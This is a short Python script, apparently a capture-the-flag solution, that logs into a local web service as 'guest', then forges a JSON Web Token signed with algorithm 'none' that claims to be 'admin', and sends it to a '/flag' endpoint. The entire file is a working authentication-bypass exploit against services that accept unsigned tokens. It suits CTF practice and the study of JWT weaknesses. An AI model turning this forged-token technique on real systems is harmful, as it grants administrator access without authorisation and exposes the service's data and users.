import requests
import json
import jwt
#pyjwt==2.7.0

HOST = "http://localhost:5502"

data = {
    "username": "guest",
    "password": "guest"
}

# /signin
signin_response = requests.post(f"{HOST}/signin", json=data)
print("/signin:", signin_response.text)
encoded_jwt = signin_response.headers['Authorization']
print("encoded jwt:", encoded_jwt)
print("header:", jwt.get_unverified_header(encoded_jwt))

# alg: noneなJWTを作成
none_jwt = jwt.encode({"username": "admin"}, key="", algorithm="none")
print("none jwt:", none_jwt)
print("header:", jwt.get_unverified_header(none_jwt))

# /flag
flag_response = requests.get(f"{HOST}/flag", headers={"Authorization": none_jwt})
print("/flag", flag_response.text)
